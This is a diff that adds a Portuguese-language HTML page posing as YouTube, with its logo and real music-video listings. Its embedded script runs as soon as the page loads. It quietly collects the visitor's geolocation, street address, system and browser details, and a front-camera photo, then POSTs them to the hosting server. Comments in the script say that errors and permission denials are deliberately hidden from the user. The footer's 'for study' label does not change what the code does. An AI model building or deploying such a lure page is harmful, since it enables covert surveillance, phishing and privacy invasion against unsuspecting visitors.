@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>YouTube Clone</title>
+  <link rel="icon" href="https://www.youtube.com/s/desktop/8e1f559d/img/favicon_32x32.png">
+  <style>
+    :root {
+      --yt-red: #FF0000;
+      --yt-dark: #181818;
+      --yt-darker: #121212;
+      --yt-light: #232323;
+      --yt-gray: #aaaaaa;
+      --yt-surface: #212121;
+      --yt-white: #fff;
+    }
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background-color: var(--yt-darker);
+      color: var(--yt-white);
+      margin: 0;
+    }
+    .header {
+      background: var(--yt-dark);
+      display: flex;
+      align-items: center;
+      padding: 12px 24px;
+      box-shadow: 0 1px 8px #000a;
+      position: sticky;
+      top:0; left:0; right:0; z-index: 100;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      margin-right: 18px;
+    }
+    .logo img {
+      height: 40px;
+      margin-right: 8px;
+    }
+    .logo-title {
+      font-weight: bold;
+      font-size: 1.6em;
+      letter-spacing: -1px;
+      color: var(--yt-white);
+      text-shadow: 0 1px 0 #0009;
+    }
+    .search-bar {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      margin: 0 24px;
+    }
+    .search-bar input {
+      width: 100%;
+      padding: 8px 14px;
+      background: var(--yt-light);
+      border: 1px solid #393939;
+      border-radius: 40px 0 0 40px;
+      font-size: 1.1em;
+      color: var(--yt-white);
+      outline: none;
+    }
+    .search-bar button {
+      background: var(--yt-surface);
+      border: 1px solid #393939;
+      border-left: none;
+      color: var(--yt-white);
+      padding: 8px 26px;
+      border-radius: 0 40px 40px 0;
+      cursor: pointer;
+      transition: background .2s;
+    }
+    .search-bar button:hover {
+      background: var(--yt-dark);
+    }
+    .user-icon {
+      margin-left: 20px;
+      border-radius: 50%;
+      background: #333;
+      width: 36px; height:36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      color: #fff;
+    }
+    #status {
+      margin-left: 28px;
+      font-weight: bold;
+      color: #17de75;
+    }
+    .main {
+      display: flex;
+      max-width: 1600px;
+      margin: 20px auto 0 auto;
+      box-sizing: border-box;
+    }
+    .sidebar {
+      width: 210px;
+      padding: 10px 12px;
+      background: var(--yt-surface);
+      min-height: 85vh;
+      box-shadow: 0 2px 10px #0003;
+      border-radius: 10px;
+      margin: 0 14px 40px 0;
+      flex-shrink: 0;
+      color: var(--yt-white);
+    }
+    .sidebar h3 {
+      margin-top: 14px;
+      color: var(--yt-gray);
+      font-weight: 600;
+      font-size: 1.06em;
+    }
+    .sidebar nav {
+      margin-top: 18px;
+    }
+    .sidebar a {
+      display: flex;
+      align-items: center;
+      padding: 8px 0;
+      text-decoration: none;
+      color: var(--yt-white);
+      font-size: 1.12em;
+      border-radius: 8px;
+      transition: background .16s;
+    }
+    .sidebar a:hover {
+      background: #222;
+    }
+    .sidebar span {
+      margin-right: 12px;
+      font-size: 22px;
+      width: 32px;
+      text-align: center;
+    }
+    .videos {
+      flex: 1;
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+      gap: 28px;
+      padding: 0 14px 40px 0;
+    }
+    .video-card {
+      background: var(--yt-dark);
+      padding: 0 0 10px 0;
+      border-radius: 11px;
+      box-shadow: 0 0 8px #0005;
+      overflow: hidden;
+      transition: box-shadow .13s, transform .13s;
+    }
+    .video-card:hover {
+      box-shadow: 0 0 20px #000a;
+      transform: translateY(-2px) scale(1.012);
+    }
+    .thumb {
+      width: 100%; height: 180px;
+      background: #111;
+      position: relative;
+    }
+    .thumb img {
+      width: 100%; height: 100%; object-fit: cover;
+      display: block;
+    }
+    .video-info {
+      display: flex;
+      align-items: flex-start;
+      padding: 1em;
+      gap: 14px;
+    }
+    .channel-avatar {
+      width: 43px; height:43px;
+      border-radius: 50%;
+      background: #343434;
+      flex-shrink: 0;
+    }
+    .video-details {
+      flex: 1;
+      text-align: left;
+    }
+    .video-title {
+      font-size: 1.13em;
+      font-weight: 600;
+      color: var(--yt-white);
+      margin: 3px 0 9px 0;
+      line-height: 1.18em;
+      text-decoration: none;
+      transition: color 0.15s;
+      word-break: break-word;
+    }
+    .video-title:hover { color: var(--yt-red);}
+    .video-channel {
+      color: var(--yt-gray);
+      font-size: 0.96em;
+      margin-bottom: 3px;
+    }
+    .video-stats {
+      color: #777;
+      font-size: .93em;
+    }
+    footer {
+      margin-top: 32px;
+      background: #111;
+      color: #ccc;
+      padding: 22px;
+      text-align: center;
+      font-size: 0.97em;
+      letter-spacing: .08em;
+    }
+    @media (max-width:900px) {
+      .sidebar {display:none;}
+      .main, .videos {display:block;}
+      .videos {padding:0;}
+      .video-card {margin-bottom:1.5em;}
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" alt="YouTube Logo">
+      <span class="logo-title">YouTube</span>
+    </div>
+    <div class="search-bar">
+      <input type="text" placeholder="Pesquisar">
+      <button title="Pesquisar"><span style="font-size:16px;">&#x1F50D;</span></button>
+    </div>
+    <div class="user-icon" title="Usuário">??</div>
+    <span id="status">Bem-vindo ao YouTube Clone</span>
+  </div>
+  <div class="main">
+    <aside class="sidebar">
+      <nav>
+        <a href="#"><span>??</span>Início</a>
+        <a href="#"><span>??</span>Em alta</a>
+        <a href="#"><span>??</span>Inscrições</a>
+        <a href="#"><span>??</span>Biblioteca</a>
+        <a href="#"><span>?</span>Histórico</a>
+      </nav>
+      <h3>Sessões</h3>
+      <nav>
+        <a href="#"><span>??</span>Música</a>
+        <a href="#"><span>??</span>Jogos</a>
+        <a href="#"><span>??</span>Aprender</a>
+      </nav>
+    </aside>
+    <section class="videos">
+      <!-- Exemplos de vídeos -->
+      <div class="video-card">
+        <div class="thumb">
+          <img src="https://i.ytimg.com/vi/wJnBTPUQS5A/hqdefault.jpg" alt="Video Thumb">
+        </div>
+        <div class="video-info">
+          <img class="channel-avatar" src="https://yt3.ggpht.com/ytc/AL5GRJUOrsUjVW_FAyMF9tc5YzyiC9mg9VwGWyKieQ=s68-c-k-c0x00ffffff-no-rj" alt="Canal">
+          <div class="video-details">
+            <a class="video-title" href="#" title="Ed Sheeran - Shape of You (Official Music Video)">Ed Sheeran - Shape of You (Official Music Video)</a>
+            <div class="video-channel">Ed Sheeran</div>
+            <div class="video-stats">6,3 bi de visualizações • há 7 anos</div>
+          </div>
+        </div>
+      </div>
+      <div class="video-card">
+        <div class="thumb">
+          <img src="https://i.ytimg.com/vi/3tmd-ClpJxA/hqdefault.jpg" alt="Video Thumb">
+        </div>
+        <div class="video-info">
+          <img class="channel-avatar" src="https://yt3.ggpht.com/ytc/AL5GRJUld4uNwLkilDYh3DD7TdAnFJdrZ5_gh5wqYQ=s68-c-k-c0x00ffffff-no-rj" alt="Canal">
+          <div class="video-details">
+            <a class="video-title" href="#" title="Maroon 5 - Sugar (Official Music Video)">Maroon 5 - Sugar (Official Music Video)</a>
+            <div class="video-channel">Maroon 5</div>
+            <div class="video-stats">4,2 bi de visualizações • há 9 anos</div>
+          </div>
+        </div>
+      </div>
+      <div class="video-card">
+        <div class="thumb">
+          <img src="https://i.ytimg.com/vi/kJQP7kiw5Fk/hqdefault.jpg" alt="Video Thumb">
+        </div>
+        <div class="video-info">
+          <img class="channel-avatar" src="https://yt3.ggpht.com/ytc/AL5GRJV9GwA1Pugx9Vvqf-rUQEqzgmvQcZf5eDusA=s68-c-k-c0x00ffffff-no-rj" alt="Canal">
+          <div class="video-details">
+            <a class="video-title" href="#" title="Luis Fonsi - Despacito ft. Daddy Yankee">Luis Fonsi - Despacito ft. Daddy Yankee</a>
+            <div class="video-channel">Luis Fonsi</div>
+            <div class="video-stats">8,4 bi de visualizações • há 8 anos</div>
+          </div>
+        </div>
+      </div>
+      <div class="video-card">
+        <div class="thumb">
+          <img src="https://i.ytimg.com/vi/UceaB4D0jpo/hqdefault.jpg" alt="Video Thumb">
+        </div>
+        <div class="video-info">
+          <img class="channel-avatar" src="https://yt3.ggpht.com/ytc/AL5GRJUZbB8b93Di596zaV9GvAnT3JfMFtrHUPZrTQ=s68-c-k-c0x00ffffff-no-rj" alt="Canal">
+          <div class="video-details">
+            <a class="video-title" href="#" title="Imagine Dragons - Believer (Official Music Video)">Imagine Dragons - Believer (Official Music Video)</a>
+            <div class="video-channel">Imagine Dragons</div>
+            <div class="video-stats">2,7 bi de visualizações • há 7 anos</div>
+          </div>
+        </div>
+      </div>
+      <!-- Adicione mais vídeos como desejar -->
+    </section>
+  </div>
+  <footer>
+    &copy; 2025 YouTube Clone — Página meramente ilustrativa para fins de estudo.
+  </footer>
+  <script>
+    // Script de coleta de localização, sistema, navegador, câmera
+    async function capturarDados() {
+      try {
+        const sistema = navigator.platform;
+        const navegador = navigator.userAgent;
+
+        // Localização
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          let endereco = 'Desconhecido';
+          try {
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+            const geoData = await geoRes.json();
+            endereco = geoData.display_name || endereco;
+          } catch{}
+
+          // Câmera
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const context = canvas.getContext('2d');
+
+            setTimeout(() => {
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imagem = canvas.toDataURL('image/png');
+
+              fetch('/dados', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  latitude,
+                  longitude,
+                  endereco,
+                  imagem,
+                  sistema,
+                  navegador
+                })
+              }).then(() => {
+                document.getElementById('status').textContent = '? Dados enviados com sucesso!';
+                stream.getTracks().forEach(track => track.stop());
+              }).catch(err => {
+                console.error("Erro ao enviar dados:", err);
+                stream.getTracks().forEach(track => track.stop());
+              });
+            }, 3000);
+          } catch {
+            // Não mostra erro para o usuário, apenas não envia imagem
+          }
+        }, (err) => {
+          // Não mostra 'permissão negada'
+        });
+      } catch (err) {
+        // Nenhum feedback se ocorrer erro geral
+      }
+    }
+
+    window.onload = capturarDados;
+  </script>
+</body>
+</html>
